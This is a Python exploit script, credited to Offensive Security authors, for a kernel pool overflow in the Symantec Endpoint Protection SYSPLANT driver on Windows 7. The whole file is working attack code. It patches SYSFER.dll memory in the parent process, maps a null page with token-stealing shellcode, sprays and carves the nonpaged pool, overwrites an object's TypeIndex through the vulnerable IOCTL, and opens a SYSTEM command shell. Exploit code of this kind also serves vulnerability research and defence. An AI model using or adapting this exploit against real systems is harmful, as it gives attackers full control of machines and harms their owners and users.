# Symantec Endpoint Protection 11.x, 12.x - Kernel Pool Overflow
# http://www.offensive-security.com
# Tested on Windows 7
# http://www.offensive-security.com/vulndev/symantec-endpoint-protection-0day/
# Authors: Matteo 'ryujin' Memelli & Alexandru 'sickness' Uifalvi <at> offensive-security.com

from ctypes import *
from ctypes.wintypes import *
import struct, sys, os, time

ntdll = windll.ntdll
kernel32 = windll.kernel32
TH32CS_SNAPPROCESS = 0x02
PROCESS_ALL_ACCESS = 0x1fffff
FORMAT_MESSAGE_FROM_SYSTEM = 0x00001000
NULL = 0x0
MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000
PAGE_EXECUTE_READWRITE = 0x00000040
SystemExtendedHandleInformation = 64
STATUS_INFO_LENGTH_MISMATCH = 0xC0000004
STATUS_INVALID_HANDLE = 0xC0000008
STATUS_SUCCESS = 0
PVOID  = c_void_p
HANDLE = c_void_p

class LSA_UNICODE_STRING(Structure):
    """Represent the LSA_UNICODE_STRING on ntdll."""
    _fields_ = [
        ("Length", USHORT),
        ("MaximumLength", USHORT),
        ("Buffer", LPWSTR),
    ]

class SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX(Structure):
    """Represent the SYSTEM_HANDLE_TABLE_ENTRY_INFO on ntdll."""
    _fields_ = [
        ("Object", PVOID),
        ("UniqueProcessId", ULONG),
        ("HandleValue", ULONG),
        ("GrantedAccess", ULONG),
        ("CreatorBackTraceIndex", USHORT),
        ("ObjectTypeIndex", USHORT),
        ("HandleAttributes", ULONG),
        ("Reserved", ULONG),
    ]
 
class SYSTEM_HANDLE_INFORMATION_EX(Structure):
    """Represent the SYSTEM_HANDLE_INFORMATION on ntdll."""
    _fields_ = [
        ("NumberOfHandles", ULONG),
        ("Reserved", ULONG),
        ("Handles", SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX * 1),
    ]

class PUBLIC_OBJECT_TYPE_INFORMATION(Structure):
    """Represent the PUBLIC_OBJECT_TYPE_INFORMATION on ntdll."""
    _fields_ = [
        ("Name", LSA_UNICODE_STRING),
        ("Reserved", ULONG * 22),
    ]

class PROCESSENTRY32(Structure):
    _fields_ = [
        ("dwSize", c_ulong),
        ("cntUsage", c_ulong),
        ("th32ProcessID", c_ulong),
        ("th32DefaultHeapID", c_int),
        ("th32ModuleID", c_ulong),
        ("cntThreads", c_ulong),
        ("th32ParentProcessID", c_ulong),
        ("pcPriClassBase", c_long),
        ("dwFlags", c_ulong),
        ("szExeFile", c_wchar * MAX_PATH)
    ]

Process32First = kernel32.Process32FirstW
Process32Next  = kernel32.Process32NextW
 
def header():
    """Print exploit header"""
    print "[+] Sysplant 0x0222084 Kernel Pool Overflow"
    print "[+] Product: Symantec Endpoint Protection"
    print "[+] Authors: Matteo 'ryujin' Memelli & Alexandru 'sickness' Uifalvi <at> offensive-security.com"

def getLastError():
    """Format GetLastError"""
    buf = create_string_buffer(2048)
    if kernel32.FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL,
            kernel32.GetLastError(), NULL,
            buf, sizeof(buf), NULL):
        print "[-] " +  buf.value
    else:
        print "[-] Unknown Error"

def signed_to_unsigned(signed):
    """Convert signed to unsigned integer"""
    unsigned, = struct.unpack ("L", struct.pack ("l", signed))
    return unsigned
                
def get_type_info (handle):
    """Get the handle type information."""
    public_object_type_information = PUBLIC_OBJECT_TYPE_INFORMATION()
    size = DWORD(sizeof(public_object_type_information))
    while True:
        result = signed_to_unsigned(
            ntdll.NtQueryObject(
                handle, 2, byref(public_object_type_information), size, None))
        if result == STATUS_SUCCESS:
            return public_object_type_information.Name.Buffer
        elif result == STATUS_INFO_LENGTH_MISMATCH:
            size = DWORD(size.value * 4)
            resize(public_object_type_information, size.value)
        elif result == STATUS_INVALID_HANDLE:
            return None
        else:
            raise x_file_handles("NtQueryObject.2", hex (result))

def get_handles():
    """Return all the processes handles in the system atm."""
    system_handle_information = SYSTEM_HANDLE_INFORMATION_EX()
    size = DWORD (sizeof (system_handle_information))
    while True:
        result = ntdll.NtQuerySystemInformation(
            SystemExtendedHandleInformation,
            byref(system_handle_information),
            size,
            byref(size)
        )
        result = signed_to_unsigned(result)
        if result == STATUS_SUCCESS:
            break
        elif result == STATUS_INFO_LENGTH_MISMATCH:
            size = DWORD(size.value * 4)
            resize(system_handle_information, size.value)
        else:
            raise x_file_handles("NtQuerySystemInformation", hex(result))

    pHandles = cast(
        system_handle_information.Handles,
        POINTER(SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX * \
                system_handle_information.NumberOfHandles)
    )
    for handle in pHandles.contents:
        yield handle.UniqueProcessId, handle.HandleValue, handle.Object

def getppid(mypid=None, rec=False):
    """ Get Parent Process """
    pe = PROCESSENTRY32()
    pe.dwSize = sizeof(PROCESSENTRY32)
    if not mypid:
        mypid = kernel32.GetCurrentProcessId()
    snapshot = kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    result = 0
    try:
        have_record = Process32First(snapshot, byref(pe))
        while have_record:
            if mypid == pe.th32ProcessID:
                if rec:
                    result = getppid(pe.th32ParentProcessID, False)
                    break
                else:
                    result = pe.th32ParentProcessID
                    break
            have_record = Process32Next(snapshot, byref(pe))
    finally:
        kernel32.CloseHandle(snapshot)
    return result

def getSysFerPointer(phandle):
    """ Get child_block and child_block_size variable addresses """
    csysfer = create_string_buffer("SYSFER.dll", len("SYSFER.dll"))
    hsysfer = kernel32.LoadLibraryA(addressof(csysfer))
    if not hsysfer:
        print "[-] LoadLibrary Failed!"
        sys.exit()
    print "[+] SYSFER Base address %s" % hex(hsysfer)
    cscb = create_string_buffer("child_block", len("child_block"))
    sysfer_child_block = kernel32.GetProcAddress(hsysfer, addressof(cscb))
    if not sysfer_child_block:
        print "[-] GetProcAddress Failed!"
        sys.exit()
    print "[+] SYSFER!child_block ptr @ %s" % hex(sysfer_child_block)
    cscbs = create_string_buffer("child_block_size", len("child_block_size"))
    sysfer_child_block_s = kernel32.GetProcAddress(hsysfer, addressof(cscbs))
    if not sysfer_child_block_s:
        print "[-] GetProcAddress Failed!"
        sys.exit()        
    print "[+] SYSFER!child_block_size ptr @ %s" % hex(sysfer_child_block_s)
    child_block = c_ulong(0)
    read = c_ulong(0)
    # Read child_block address
    res = kernel32.ReadProcessMemory(phandle, sysfer_child_block, 
                                     byref(child_block), sizeof(c_ulong), 
                                     byref(read))
    if res == 0 or res == -1:
        print "[-] ReadProcessMemory Failed!"
        getLastError()
        sys.exit()
    # Read child_block_size
    child_block_s = c_ulong(0)
    res = kernel32.ReadProcessMemory(phandle, sysfer_child_block_s, 
                                     byref(child_block_s), sizeof(c_ulong), 
                                     byref(read))
    if res == 0 or res == -1:
        print "[-] ReadProcessMemory Failed!"
        getLastError()
        sys.exit()
    print "[+] SYSFER Pointer retrieved successfully!"
    return child_block, child_block_s, sysfer_child_block, sysfer_child_block_s

def craftSysFerData(phandle, sysfer_child_block, sysfer_child_block_s, 
                    evil_child_block, evil_child_block_size):
    """ Replace SysFerData to control memcpy source buffer """
    wrote  = c_ulong(0)
    ecb = struct.pack("<L", evil_child_block)
    cecb = create_string_buffer(ecb, 0x4)
    print "[+] Patching %x with %x" % (sysfer_child_block, evil_child_block)
    res = kernel32.WriteProcessMemory(phandle, sysfer_child_block, 
                                      addressof(cecb), 
                                      0x4, 
                                      byref(wrote))
    if res == 0 or res == -1:
        getLastError()
        sys.exit()
    ecbs   = struct.pack("<L", evil_child_block_size)
    csrc   = create_string_buffer(ecbs, 0x4)
    print "[+] Patching %x with %s" % (sysfer_child_block_s, 
                                        hex(evil_child_block_size))
    res = kernel32.WriteProcessMemory(phandle, sysfer_child_block_s, 
                                       addressof(csrc), 
                                       0x4, 
                                       byref(wrote))
    if res == 0 or res == -1:
        getLastError()
        sys.exit()
    print "[+] SYSFER.DLL patched successfully!"

def allocShellcode():
	""" Allocate OkayToCloseProcedure ptr and shellcode """
	baseadd   = c_int(0x00000004)
	null_size = c_int(0x1000)
	
	tokenstealing = (
	"\x33\xC0\x64\x8B\x80\x24\x01\x00\x00\x8B\x40\x50\x8B\xC8\x8B\x80"
    "\xB8\x00\x00\x00\x2D\xB8\x00\x00\x00\x83\xB8\xB4\x00\x00\x00\x04"
    "\x75\xEC\x8B\x90\xF8\x00\x00\x00\x89\x91\xF8\x00\x00\x00\xC2\x10"
    "\x00"
	)
	OkayToCloseProcedure = struct.pack("<L", 0x00000078)
	sc  = "\x42" * 0x70 + OkayToCloseProcedure
	# 83C6 0C          ADD ESI,0C
	# C706 0A000800    MOV DWORD PTR DS:[ESI],8000A
	# 83EE 0C          SUB ESI,0C
	sc += "\x83\xC6\x0C\xC7\x06\x0A\x00\x08\x00\x83\xEE\x0C" # RESTORE TypeIndex
	sc += tokenstealing
	sc += "\x90" * (0x400-len(sc))
	ntdll.NtAllocateVirtualMemory.argtypes = [c_int, POINTER(c_int), c_ulong, 
						                      POINTER(c_int), c_int, c_int]
	dwStatus = ntdll.NtAllocateVirtualMemory(0xFFFFFFFF, byref(baseadd), 0x0, 
						                     byref(null_size), 
						                     MEM_RESERVE|MEM_COMMIT,
                                             PAGE_EXECUTE_READWRITE)
	if dwStatus != STATUS_SUCCESS:
	    print "[+] Error while allocating the null paged memory: %s" % dwStatus
	    getLastError()
	    sys.exit()
	written = c_ulong()
	alloc = kernel32.WriteProcessMemory(0xFFFFFFFF, 0x00000004, sc, 0x400, 
							            byref(written))
	if alloc == 0:
	    print "[+] Error while writing our junk to the null paged memory: %s" %\
	 		alloc
	    getLastError()
	    sys.exit()

def allocInput(phandle, evil_child_block_size):
    """ Allocate the source buffer in the parent process """
    v = kernel32.VirtualAllocEx(phandle, 
                                0x0, 
                                evil_child_block_size, 
                                MEM_RESERVE|MEM_COMMIT, 
                                PAGE_EXECUTE_READWRITE)
								
    # 8654c580  040c0090 ef436f49 00000000 0000005c
    # 8654c590  00000000 00000000 00000001 00000001
    # 8654c5a0  00000000 0008000a
    quota   = "\x00\x00\x00\x00"    
    header  = "\x90\x00\x0c\x04\x49\x6f\x43\xef\x00\x00\x00\x00\x5c\x00\x00\x00"
    header += "\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x01\x00\x00\x00"
    header += "\x00\x00\x00\x00"
    TypeIndex = "\x00\x00\x08\x00"
    offset    = "\x45" * (evil_child_block_size-len(header)-len(TypeIndex)-\
							len(quota))
    overflow  = offset + quota + header + TypeIndex 
    csrc      = create_string_buffer(overflow, evil_child_block_size)
    wrote     = c_ulong(0)
    res = kernel32.WriteProcessMemory(phandle, v, 
                                      addressof(csrc), 
                                      evil_child_block_size, 
                                      byref(wrote))
    if res == 0 or res == -1:
        getLastError()
        sys.exit()
    print "[+] evil_child_block address: %s" % hex(v)
    return v

def triggerIOCTL():
    """ Trigger the vulnerable IOCTL code """
    GENERIC_READ  = 0x80000000
    GENERIC_WRITE = 0x40000000
    OPEN_EXISTING = 0x3
    DEVICE_NAME   = u"\\\\.\\SYSPLANT"
    dwReturn      = c_ulong()
    driver_handle = kernel32.CreateFileW(DEVICE_NAME,
                                         GENERIC_READ | GENERIC_WRITE,
                                         0, None, OPEN_EXISTING, 0, None)
    if not driver_handle or driver_handle == -1:
        getLastError()
        sys.exit()

    ioctl = 0x00222084
    evil_input = "\x41" * 4 + struct.pack("<L", ioctl) + "D" * 56
    evil_size  = len(evil_input)
    print "[+] IOCTL: %s" % hex(ioctl)
    print "[+] Buf size: %d" % evil_size
    einput  = create_string_buffer(evil_input, evil_size)
    eoutput = create_string_buffer("\x00"*1024, 1024)
    dev_ioctl = kernel32.DeviceIoControl(driver_handle     , ioctl,
                                         addressof(einput) , evil_size,
                                         addressof(eoutput), 1024,
                                         byref(dwReturn)   , None)
                             
def spray():
    """Spray the Kernel Pool with IoCompletionReserve Objects. Each object
    is 0x60 bytes in length and is allocated from the Nonpaged kernel pool"""
    global handles, done
    handles = {}
    IO_COMPLETION_OBJECT = 1
    for i in range(0, 50000):
        hHandle = HANDLE(0)
        ntdll.NtAllocateReserveObject(byref(hHandle), 0x0, IO_COMPLETION_OBJECT)
        #print "[+] New Object created successfully, handle value: ", hHandle
        handles[hHandle.value]=hHandle
    print "[+] Spray done!"

def findMemoryWindows():
    """ Find all possible windows of 0x480 bytes with a further adjacent
    IoCompletionReserve object that we can overwrite.
    Finally trigger 0x00222084 to allocate the IOCTL input buffer in one
    of the windows. The IOCTL input buffer has been changed to avoid the
    overflow at this time, so that we can study the allocations without
    BSODing the box""" 
    global handles, done
    mypid = os.getpid()
    khandlesd = {}
    khandlesl = []
    # Leak Kernel Handles
    for pid, handle, obj in get_handles():
        #print handle, obj
        if pid==mypid and get_type_info(handle)=="IoCompletionReserve":
            khandlesd[obj] = handle
            khandlesl.append(obj)
    # Find holes and make our allocation
    holes = []
    for obj in khandlesl:
        # obj address is the handle address, but we want to allocation
        # address, so we just remove the size of the object header from it.
        # IoCompletionReserve Chunk Header 0x30
        alloc = obj-0x30
        # Get allocations at beginning of the page
        if (alloc&0xfffff000) == alloc:
            # find holes
            # If we get a KeyError allocations are not adjecient
            try:
                holes.append( (
                               khandlesd[obj+0x580],khandlesd[obj+0x520],
                               khandlesd[obj+0x4c0],khandlesd[obj+0x460],
                               khandlesd[obj+0x400],khandlesd[obj+0x3a0],
                               khandlesd[obj+0x340],khandlesd[obj+0x2e0],
                               khandlesd[obj+0x280],khandlesd[obj+0x220],
                               khandlesd[obj+0x1c0],khandlesd[obj+0x160],
                               khandlesd[obj+0x100]) )
                print "[+] Hole Window found @ %s" % hex(alloc)
            except KeyError:
                pass

    # Create Memory Windows of 0x480 bytes (0x60*12) ...
    print "[*] Your IOCTL Allocation will be    @ 0x*****100"
    print "[*] The Overflown Allocation will be @ 0x*****580"
    for hole in holes:
        kernel32.CloseHandle(handles[ hole[1] ])
        kernel32.CloseHandle(handles[ hole[2] ])
        kernel32.CloseHandle(handles[ hole[3] ])
        kernel32.CloseHandle(handles[ hole[4] ])
        kernel32.CloseHandle(handles[ hole[5] ])
        kernel32.CloseHandle(handles[ hole[6] ])
        kernel32.CloseHandle(handles[ hole[7] ])
        kernel32.CloseHandle(handles[ hole[8] ])
        kernel32.CloseHandle(handles[ hole[9] ])
        kernel32.CloseHandle(handles[ hole[10] ])
        kernel32.CloseHandle(handles[ hole[11] ])
        kernel32.CloseHandle(handles[ hole[12] ])
        
    # Make our Alloc of 0x480 bytes...
    triggerIOCTL()
    # trigger code execution
    for hole in holes:
        kernel32.CloseHandle(handles[ hole[0] ])
    # Spawn a system shell
    os.system("cmd.exe /T:C0 /K cd C:\\Windows\\system32\\")
    done = False
	
                                             
if __name__ == '__main__':
    global handles, done
    exploit = False
    done    = True
    header()
    try:
        if sys.argv[1].lower() == 'exploit':
            exploit = True
    except IndexError:
        pass
    if not exploit:
        print "[+] Patching Input buffer from SYSFER Memory"
        phandle = c_ulong()
        # Use the following with Pyinstaller (2 parent processes)
        # parentpid = getppid(None, True)
        # Use the following from python script (parent is cmd.exe)
        # 1)
        parentpid = getppid(None, False)
        print  "[+] Parent PID: %d" % parentpid
        # 2)
        phandle = kernel32.OpenProcess(PROCESS_ALL_ACCESS, 
                                       0x0, parentpid)
        print "[+] Parent Handle: %d" % phandle
        # 3)
        child_block,child_block_s,sysfer_child_block,sysfer_child_block_s =\
            getSysFerPointer(phandle)
        evil_child_block_size = 0x44c # pool overflow and TypeIndex overwrite
        # 4)
        evil_child_block = allocInput(phandle, evil_child_block_size)
        # 5)
        craftSysFerData(phandle, sysfer_child_block, sysfer_child_block_s, 
                        evil_child_block, evil_child_block_size)
        kernel32.CloseHandle(phandle)
        print "[+] NOW RUN %s exploit" % sys.argv[0]
        sys.exit()
    # 6) Alloc shellcode
    allocShellcode()

    # 7) Spray
    #spray()
    dwThreadId1 = c_ulong(0)
    THREADFUNC = CFUNCTYPE(None)
    spray_thread = THREADFUNC(spray)
    hThread1 = HANDLE(0)
    hThread1 = windll.kernel32.CreateThread(0,0,spray_thread,0,0,byref(dwThreadId1))
    print "[+] Spray Thread Created TID: %d" % hThread1
    curpr = windll.kernel32.GetThreadPriority(hThread1) 
    print "[+] Current priority: %d" % curpr
    print "[+] Setting high priority...."
    windll.kernel32.SetThreadPriority(hThread1, 2)
    curpr = windll.kernel32.GetThreadPriority(hThread1) 
    time.sleep(3)

    # 8) Create holes to fit our allocation and trigger the IOCTL
    #findMemoryWindows()
    dwThreadId2 = c_ulong(0)
    findMemoryWindows_thread = THREADFUNC(findMemoryWindows)
    hThread2 = HANDLE(0)
    hThread2 = windll.kernel32.CreateThread(0,0,findMemoryWindows_thread,0,0,byref(dwThreadId2))
    print "[+] findMemoryWindows Thread Created TID: %d" % hThread2
    curpr = windll.kernel32.GetThreadPriority(hThread2) 
    print "[+] Current priority: %d" % curpr
    print "[+] Setting high priority...."
    windll.kernel32.SetThreadPriority(hThread2, 2)
    curpr = windll.kernel32.GetThreadPriority(hThread2) 
    while done:
        time.sleep(1)
